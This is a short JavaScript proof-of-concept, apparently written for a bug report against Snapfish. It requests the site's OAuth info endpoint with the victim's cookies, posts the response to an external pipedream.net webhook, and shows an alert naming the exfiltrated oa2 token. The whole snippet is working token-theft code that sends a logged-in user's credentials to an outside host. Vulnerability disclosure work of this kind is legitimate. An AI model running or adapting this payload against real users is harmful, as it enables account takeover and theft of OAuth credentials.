fetch('https://www.snapfish.com/library/getOauthInfo', {
    credentials: 'include'
})
.then(function (r) {
    return r.json();
})
.then(function (data) {
    fetch('https://eoeyl49g7f6zxem.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(function (e) {});

    alert('EXFILTRATED TO @m4rc10sz\'s WEBHOOK: \n\n' + data.oauthInfo.oa2);
})
.catch(function (e) {
    alert('Error: ' + e);
});
